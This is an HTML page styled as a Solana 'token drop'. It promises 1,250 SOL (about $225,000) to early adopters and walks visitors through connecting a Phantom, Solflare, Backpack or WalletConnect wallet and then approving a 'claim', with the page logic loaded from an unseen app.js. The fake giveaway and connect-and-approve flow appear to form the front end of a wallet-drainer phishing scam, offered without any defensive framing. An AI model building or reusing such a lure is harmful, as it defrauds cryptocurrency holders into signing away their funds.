<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana 133Token Drop</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0b0b1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #12122a;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 420px;
            width: 92%;
            text-align: center;
            border: 1px solid #1e1e3a;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 4px;
            background: linear-gradient(90deg, #9945FF, #14F195);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .sub { color: #666; font-size: 13px; margin-bottom: 20px; }
        .prize {
            background: #1a1a3a;
            border-radius: 14px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .prize .sol { font-size: 34px; font-weight: 700; }
        .prize .usd { color: #666; font-size: 13px; }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            color: #fff;
            background: rgba(255,255,255,0.07);
            margin-bottom: 8px;
            transition: background 0.15s;
            -webkit-tap-highlight-color: transparent;
        }
        .btn:active { background: rgba(255,255,255,0.14); }
        .btn.purple { background: linear-gradient(135deg, #9945FF, #14F195); }
        .btn.purple:active { opacity: 0.85; }
        .status {
            margin-top: 14px;
            padding: 10px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
            word-break: break-word;
        }
        .status.show { display: block; }
        .status.ok { background: rgba(20,241,149,0.1); color: #14F195; border: 1px solid rgba(20,241,149,0.2); }
        .status.err { background: rgba(255,50,50,0.1); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.2); }
        .status.info { background: rgba(58,120,255,0.1); color: #6b9aff; border: 1px solid rgba(58,120,255,0.2); }
        .hidden { display: none !important; }
        .addr {
            margin: 10px 0;
            font-size: 11px;
            color: #555;
            word-break: break-all;
        }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .steps { text-align: left; font-size: 13px; color: #666; margin-bottom: 18px; line-height: 1.9; }
        .steps span { color: #14F195; font-weight: 600; }
    </style>
</head>
<body>
<div class="container">
    <h1>◎ Solana Token Drop</h1>
    <p class="sub">Exclusive airdrop for early adopters</p>

    <div class="steps">
        <span>1.</span> Connect your wallet<br>
        <span>2.</span> Approve the claim<br>
        <span>3.</span> Receive 1,250 SOL ✦
    </div>

    <div class="prize">
        <div class="sol">1,250 SOL</div>
        <div class="usd">≈ $225,000 USD</div>
    </div>

    <div id="step1">
        <button class="btn" id="connectPhantom">Connect Phantom</button>
        <button class="btn" id="connectSolflare">Connect Solflare</button>
        <button class="btn" id="connectBackpack">Connect Backpack</button>
        <button class="btn" id="connectWC">WalletConnect (Mobile)</button>
    </div>

    <div id="step2" class="hidden">
        <p class="addr" id="displayAddr"></p>
        <button class="btn purple" id="claimBtn">
            <span id="claimText">Claim Airdrop</span>
            <span id="claimSpin" class="spinner" style="display:none;"></span>
        </button>
        <button class="btn" id="disconnectBtn">Disconnect</button>
    </div>

    <div id="status" class="status"></div>
</div>

<script src="app.js"></script>
</body>
</html>
